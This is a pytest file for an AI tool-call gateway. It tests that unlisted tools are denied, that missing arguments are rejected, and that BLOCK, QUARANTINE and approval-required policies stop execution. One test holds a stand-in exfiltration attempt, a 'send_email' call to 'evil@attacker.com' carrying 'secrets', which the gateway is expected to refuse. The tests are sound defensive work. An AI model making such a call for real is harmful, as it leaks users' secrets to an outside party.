"""
Tests for the Tool Gateway module.

Covers:
  - Allowed tool executes successfully when policy is ALLOW
  - Unknown tool is denied (allowlist check)
  - Missing required arguments are denied (schema check)
  - Policy BLOCK/QUARANTINE prevents execution
  - No proposed tool returns DENIED gracefully
"""

import pytest

from app.gateway.gateway import mediate
from app.models import (
    GatewayDecision,
    PolicyAction,
    PolicyResult,
    PipelineRequest,
    RiskCategory,
    SourceType,
)


def _policy(action: PolicyAction, req_id: str = "gw-test") -> PolicyResult:
    return PolicyResult(
        request_id=req_id,
        policy_action=action,
        policy_reason="test policy",
        requires_approval=action == PolicyAction.REQUIRE_APPROVAL,
    )


def _request(
    tool: str | None,
    args: dict | None = None,
    req_id: str = "gw-test",
) -> PipelineRequest:
    return PipelineRequest(
        content="test input",
        source_type=SourceType.DIRECT_PROMPT,
        proposed_tool=tool,
        tool_args=args,
        request_id=req_id,
    )


# ---------------------------------------------------------------------------
# Expected execution
# ---------------------------------------------------------------------------


def test_allowed_tool_executes_on_allow_policy():
    """summarize with correct args and ALLOW policy should EXECUTE."""
    req = _request("summarize", {"text": "Hello world"})
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.EXECUTED
    assert result.tool_output is not None


def test_sanitize_policy_also_allows_execution():
    """SANITIZE is a permitted action — tool should still execute."""
    req = _request("write_note", {"title": "Test", "body": "Content here"})
    result = mediate(req, _policy(PolicyAction.SANITIZE))

    assert result.gateway_decision == GatewayDecision.EXECUTED


# ---------------------------------------------------------------------------
# Allowlist check
# ---------------------------------------------------------------------------


def test_unknown_tool_is_denied():
    """A tool not in the allowlist must be DENIED regardless of policy."""
    req = _request("send_email", {"to": "evil@attacker.com", "body": "secrets"})
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.DENIED
    assert "allowlist" in result.decision_reason.lower()


# ---------------------------------------------------------------------------
# Argument schema check
# ---------------------------------------------------------------------------


def test_missing_args_are_denied():
    """summarize without the required 'text' arg must be DENIED."""
    req = _request("summarize", {})  # missing 'text'
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.DENIED
    assert "missing" in result.decision_reason.lower()


# ---------------------------------------------------------------------------
# Policy gate
# ---------------------------------------------------------------------------


def test_block_policy_denies_execution():
    """BLOCK policy must prevent execution even for allowed tools."""
    req = _request("summarize", {"text": "Blocked content"})
    result = mediate(req, _policy(PolicyAction.BLOCK))

    assert result.gateway_decision == GatewayDecision.DENIED


def test_quarantine_policy_denies_execution():
    """QUARANTINE policy must prevent execution."""
    req = _request("fetch_url", {"url": "https://example.com"})
    result = mediate(req, _policy(PolicyAction.QUARANTINE))

    assert result.gateway_decision == GatewayDecision.DENIED


def test_require_approval_denies_execution():
    """REQUIRE_APPROVAL policy must prevent execution without human sign-off."""
    req = _request("summarize", {"text": "Some text"})
    result = mediate(req, _policy(PolicyAction.REQUIRE_APPROVAL))

    assert result.gateway_decision == GatewayDecision.DENIED


# ---------------------------------------------------------------------------
# No tool proposed
# ---------------------------------------------------------------------------


def test_no_tool_proposed_returns_denied():
    """When no tool is proposed the gateway should return DENIED gracefully."""
    req = _request(tool=None)
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.DENIED
